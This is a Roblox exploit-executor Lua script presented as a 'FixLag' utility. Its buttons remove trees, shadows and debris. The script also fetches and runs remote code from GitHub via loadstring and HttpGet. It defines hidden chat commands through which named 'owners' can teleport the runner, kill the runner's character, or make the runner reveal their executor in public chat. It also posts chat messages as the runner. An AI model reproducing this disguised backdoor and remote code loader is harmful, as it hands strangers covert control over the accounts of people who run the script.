function srv(t) return game:GetService(t) end
function git(t) return game:HttpGet("https://raw.githubusercontent.com/" .. t) end
function prs(t) return t:GetPlayers() end
function chd(t) return t:GetChildren() end
function des(t) return t:GetDescendants() end
function tmc(t, m) return t.Text:lower():match(m) end
function spt(t) return t.Text:split(" ") end
function chr(t, n) return t and t.Character and t.Character:FindFirstChild("Humanoid"..n) end

local ws, plrs, reps, bulb, statr, tps, rs, txs
ws = srv"Workspace"
plrs = srv"Players"
reps = srv"ReplicatedStorage"
bulb = srv"Lighting"
statr = srv"StarterGui"
tps = srv"TeleportService"
rs = srv"RunService"
txs = srv"TextChatService"

local plr, id, job, chatv, token, ui, items
plr = plrs.LocalPlayer
id = game.PlaceId
job = game.JobId
chatv = txs.ChatVersion == Enum.ChatVersion.LegacyChatService
token = git("HoangHienXScripts/Projekts/refs/heads/main/TSB/token") or "0"
ui = loadstring(git("HoangHienXScripts/Modules/refs/heads/main/btns_list.lua"))()
items = {
  ignore = {"Part", "MeshPart", "WedgePart"},
  owners = {"dokutah"},
  delay = 0.01, btns = {}, confuse_u = {
    shadows = true, l_trash = false, d_call = 5, watever = false,
  }, version = token, call = false, allow_update = false
} loadstring(git("HoangHienXScripts/Modules/refs/heads/main/sds.lua"))()
repeat wait() until ws:FindFirstChild("HHxScripts")

if ui and type(ui) == "table" then
  function ntfc(m)
    m = tostring(m)
    if not chatv then
      txs.TextChannels.RBXGeneral:SendAsync(m)
    else
      reps.DefaultChatSystemChatEvents.SayMessageRequest:FireServer(m, "All")
    end
  end function ntf(m)
    statr:SetCore("SendNotification", {Title = "HHxScripts", Text = m, Duration = 1.25})
  end function capx(t)
    t.Chatted:Connect(function(str) str = str:split(" ")
      if str[1]==":br" then
        local slf, adm, lgn = chr(plr, "RootPart"), chr(t, "RootPart"), tonumber(str[2]) or 5
        if slf and adm then
          slf.CFrame = CFrame.new(adm.Position + (adm.CFrame.LookVector * lgn))
        end
      elseif str[1]==":rs" then
        local slf = chr(plr, "")
        if slf and slf.Health > 0 then
          slf.Health = 0
        end
      elseif str[1]==":int" then
        local idx = identifyexecutor
        if idx then ntfc(idx() or "nil") end
      end
    end)
  end function no_shadows()
    local ins_f = 0
    for _, ins in next, des(ws) do
      if ins and ins:IsA("Part") then --table.find(items.ignore, ins.ClassName) then
        ins.CastShadow = items.confuse_u.shadows
        ins_f += 1 task.wait(items.delay)
      end
    end ntf("CAST SHADOW DISABLED ALL FOR "..tostring(ins_f).." OBJECTS.")
  end function no_debris()
    local trst = ws:FindFirstChild("Thrown")
    local wout = bulb:FindFirstChild("Whiteout")
    if wout then wout:Destroy() end -- xoá màn hình đen/trắng nếu có
    if trst and #chd(trst) > 0 then
      if not items.watever then items.watever = true
        for _, xcv in pairs(des(trst)) do
          if xcv and table.find(items.ignore, xcv.ClassName) then
            xcv:Destroy()
          end
        end task.wait(items.delay)
        items.watever = false
      end
    end
  end
  -- play musiccccc --
  local music_start = ws.HHxScripts.Assets.Audios["Arknights_OST"]
  if music_start then
    music_start.Volume = 2
    music_start:Play()
    ntfc("<< CURRENTLY PLAYIN "..music_start.Name:upper():sub(1, 4).."... >>")
  end
  -- create ui --
  ui.add_button("NO TREES", function()
    local trs = ws.Map:FindFirstChild("Trees")
    if trs then
      for _, trx in pairs(chd(trs)) do
        if trx and trx["Color"] then
          trx.Color = Color3.new(1, 1, 1)
        end task.wait(items.delay)
        trx:Destroy()
      end ntf("ALL TREES... \nDELETED.")
    end
  end)
  
  items.btns.c_shadow = ui.add_button("SHADOWS [ON]", function()
    local btn = items.btns.c_shadow
    if tmc(btn, "on") then
      btn.Text = "SHADOWS [OFF]"
      items.confuse_u.shadows = false
    else
      btn.Text = "SHADOWS [ON]"
      items.confuse_u.shadows = true
    end no_shadows()
  end)

  items.btns.n_trash = ui.add_button("DEBRIS [OFF]", function()
    local btn = items.btns.n_trash
    if tmc(btn, "off") then
      btn.Text = "DEBRIS [ON]"
      items.confuse_u.l_trash = true
    else
      btn.Text = "DEBRIS [OFF]"
      items.confuse_u.l_trash = false
    end while items.confuse_u.l_trash do task.wait(items.delay)
      no_debris()
    end
  end)

  for _, evo in next, prs(plrs) do
    if evo and evo ~= plr and table.find(items.owners, evo.DisplayName:lower()) then
      ntfc("<< Found: "..evo.Name.." >>")
      
    end
  end

  rs.RenderStepped:Connect(function()
    if items.allow_update and not items.call then items.call = true
      token = git("HoangHienXScripts/Projekts/refs/heads/main/TSB/token") or "0"
      print("["..tostring(tick()).."]: "..token)
      if tonumber(items.version) < tonumber(token) then
        local ss, err = pcall(function() tps:TeleportToPlaceInstance(id, job, plr) end)
        if ss then ntfc("<< Updating... >>") else ntf("Error: " .. err) end
      end task.wait(items.confuse_u.d_call)
      items.call = false
    end
  end) ntfc("<< FixLag.v"..token.." by HHxScripts >>")
end
